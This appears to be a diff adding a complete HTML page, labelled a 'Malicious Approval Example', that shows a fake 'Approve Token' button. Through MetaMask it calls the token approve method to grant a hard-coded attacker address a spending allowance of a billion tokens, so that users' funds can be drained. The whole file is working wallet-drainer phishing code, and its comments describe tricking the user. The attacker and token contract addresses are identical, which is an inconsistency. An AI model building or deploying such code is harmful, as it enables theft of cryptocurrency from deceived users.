@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Malicious Approval Example</title>
+    <script src="https://cdn.jsdelivr.net/npm/web3/dist/web3.min.js"></script>
+</head>
+<body>
+    <h2>Fake Token Approval</h2>
+    <button id="approveButton">Approve Token</button>
+
+    <script>
+        // The attacker's address where funds would be drained
+        const attackerAddress = '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82';
+
+        // The token contract the attacker wants to drain
+        const tokenContractAddress = '0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82';
+        const tokenABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    { "name": "_spender", "type": "address" },
+                    { "name": "_value", "type": "uint256" }
+                ],
+                "name": "approve",
+                "outputs": [{ "name": "", "type": "bool" }],
+                "type": "function"
+            }
+        ];
+
+        // Function to request approval (This is the malicious part)
+        async function requestApproval() {
+            if (window.ethereum) {
+                const web3 = new Web3(window.ethereum);
+                const tokenContract = new web3.eth.Contract(tokenABI, tokenContractAddress);
+
+                try {
+                    const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAddress = accounts[0];
+
+                    // Trick user into approving unlimited spending
+                    await tokenContract.methods.approve(attackerAddress, web3.utils.toWei('1000000000', 'ether'))
+                        .send({ from: userAddress });
+
+                    alert('Transaction successful! You may have just been scammed.');
+                } catch (error) {
+                    console.error('Approval failed:', error);
+                }
+            } else {
+                alert('MetaMask is required to use this feature.');
+            }
+        }
+
+        // Attach the function to the button
+        document.getElementById('approveButton').addEventListener('click', requestApproval);
+    </script>
+</body>
+</html>
